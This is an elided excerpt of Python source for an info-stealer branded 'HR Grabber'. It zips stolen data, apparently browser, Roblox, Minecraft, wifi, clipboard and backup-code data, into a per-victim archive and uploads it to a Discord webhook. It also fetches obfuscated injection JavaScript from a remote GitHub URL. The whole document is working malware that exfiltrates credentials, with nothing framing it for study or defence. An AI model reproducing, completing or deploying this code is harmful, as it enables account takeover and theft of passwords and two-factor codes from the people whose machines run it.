...
def main(webhook: str):
    ...
    data = {
        "username": "HR",
        "avatar_url": "https://payhip.com/cdn-cgi/image/format=auto/https://pe56d.s3.amazonaws.com/o_1him4ivd61u8d1vck1jmn1um5itfl.png"
    }

    _file = f'{localappdata}\\HR-Logged-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes", "clipboard"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'HR-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'HR-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "HR Grabber | Created By HR_1738Gz"
                    },
                    "thumbnail": {
                        "url": "https://payhip.com/cdn-cgi/image/format=auto/https://pe56d.s3.amazonaws.com/o_1him4ivd61u8d1vck1jmn1um5itfl.png"
                    }
                }
            ],
            "username": "HR",
                            ...
                            "embeds": [
                                {
                                    ...
                                    "footer": {
                                        "text": "HR Grabber | Created By Smug"
                                    },
                                }
                            ],
                            "username": "HR",
...
class Injection:
    def __init__(self, webhook: str) -> None:
        ...
        self.code = requests.get('https://raw.githubusercontent.com/WTC-HR/HR-injection/main/obfuscated-injection.js').text
